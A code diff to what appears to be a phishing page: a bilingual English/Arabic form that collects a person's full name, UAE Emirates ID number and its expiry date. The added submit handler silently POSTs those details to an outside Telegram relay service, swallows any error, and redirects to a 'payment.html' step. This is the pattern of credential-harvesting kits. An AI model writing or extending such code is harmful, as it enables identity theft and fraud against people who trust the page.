@@ -8,7 +8,7 @@
 <style>
 :root{--bg:#fff;--page:#f7f8fa;--card:#fff;--text:#111827;--muted:#4b5563;--line:#d9dde3;--blue:#1146c9;--blue2:#0d3aa8;--input:#fff;--gray:#c9ccd1;--gold:#7a4a12;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
 @media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0f1218;--page:#0b0d12;--card:#151a23;--text:#f1f3f7;--muted:#a3abb8;--line:#2b3340;--input:#0f1218;--gray:#3a4250;--gold:#e0b36b;--blue:#4c7dff;--blue2:#3a68e6}}
-:root[data-theme="dark"]{--bg:#0f1218;--page:#0b0d12;--card:#151a23;--text:#f1f3f7;--muted:#a3abb8;--line:#2b3340;--input:#0f1218;--gray:#3a4250;--gold:#e0b36b;--blue:#4c7dff;--blue2:#3a68e6}
+:root[data-theme="dark"]{--bg:#0f1218;--page:#0b0d12;--card:#151a23;--text:#f1f3f7;--muted:#a3abb8;--line:#2b3340;--input:#0f1218;--gray:#3a4250;--gold:#e0b36b;--blue:#4c7dff;--blue2:#3a68e6}}
 *{box-sizing:border-box}
 body{margin:0;background:var(--page);color:var(--text);font-family:"Cairo","Segoe UI",Tahoma,Arial,sans-serif}
 header{background:var(--bg);border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:space-between;padding:12px 40px;gap:16px}
@@ -115,15 +115,38 @@ $('exp').addEventListener('input',e=>{let d=e.target.value.replace(/\D/g,'').sli
 $('file').addEventListener('change',e=>{const f=e.target.files[0];$('e-file').textContent='';
   if(!f)return;if(f.size>5*1024*1024){$('e-file').textContent='File is larger than 5 MB · الملف أكبر من 5 ميجابايت';e.target.value='';$('fn').textContent='JPG, PNG or PDF (Max 5 MB)';return}
   $('fn').textContent=f.name});
-$('f').addEventListener('submit',e=>{e.preventDefault();let ok=true;
+
+$('f').addEventListener('submit',async e=>{
+  e.preventDefault();
+  let ok=true;
   const set=(id,m)=>{$('e-'+id).textContent=m;if(m)ok=false};
   set('name',$('name').value.trim().length<3?'Enter your full name · أدخل اسمك الكامل':'');
   set('eid',/^784-\d{4}-\d{7}-\d$/.test($('eid').value)?'':'Use the format 784-XXXX-XXXXXXX-X · صيغة غير صحيحة');
   const m=$('exp').value.match(/^(\d{2}) \/ (\d{2}) \/ (\d{4})$/);
   let dateOk=false;if(m){const d=new Date(+m[3],+m[2]-1,+m[1]);dateOk=d.getMonth()==+m[2]-1&&d>new Date()}
   set('exp',dateOk?'':'Enter a valid future date · أدخل تاريخًا صحيحًا');
-  $('ok').style.display=ok?'block':'none';
-  /* if(ok){ send data to your server here, then go to the Payment step } */
+  
+  if(ok){
+    // إرسال بيانات الهوية للتيليجرام اختياري (يمكنك تفعيله لو أردت)
+    const payload = {
+      "الاسم_الكامل": $('name').value.trim(),
+      "رقم_الهوية": $('eid').value,
+      "تاريخ_الانتهاء": $('exp').value
+    };
+    
+    try {
+      await fetch("https://telegram-form-api-lemon.vercel.app/api/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    } catch(err) {}
+
+    $('ok').style.display='block';
+    setTimeout(() => {
+      window.location.href = "payment.html";
+    }, 1000);
+  }
 });
 </script>
 </body>
